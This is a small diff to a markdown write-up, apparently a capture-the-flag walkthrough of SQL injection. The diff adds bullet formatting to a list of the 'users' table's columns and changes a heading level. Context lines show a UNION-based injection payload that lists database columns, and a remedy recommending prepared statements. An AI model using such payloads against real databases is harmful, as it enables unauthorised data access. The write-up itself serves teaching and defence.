@@ -15,15 +15,15 @@ From here on out we can genlty manipulate the database and ask it to give the na
 * 1 UNION (SELECT COLUMN_NAME, 1 FROM information_schema.columns );--
 
 ### One of these tables is users
-> Table : users
-> Colunm : user_id
-> Colunm : first_name
-> Colunm : last_name
-> Colunm : town
-> Colunm : country
-> Colunm : planet
-> Colunm : Commentaire
-> Colunm : countersign
+> * Table : users
+> * Colunm : user_id
+> * Colunm : first_name
+> * Colunm : last_name
+> * Colunm : town
+> * Colunm : country
+> * Colunm : planet
+> * Colunm : Commentaire
+> * Colunm : countersign
 
  * And through a number of these commands we are able to retrieve out flag   
 ### Retrive flag
@@ -40,5 +40,5 @@ From here on out we can genlty manipulate the database and ask it to give the na
 ## Remedy
 * Now all of this  can be prevented by using prepared statements. Prepared statement will tell that database to look at the input as nothing else but just that, an input.
 
-# Resources
+## Resources
 * https://www.youtube.com/watch?v=ciNHn38EyRc
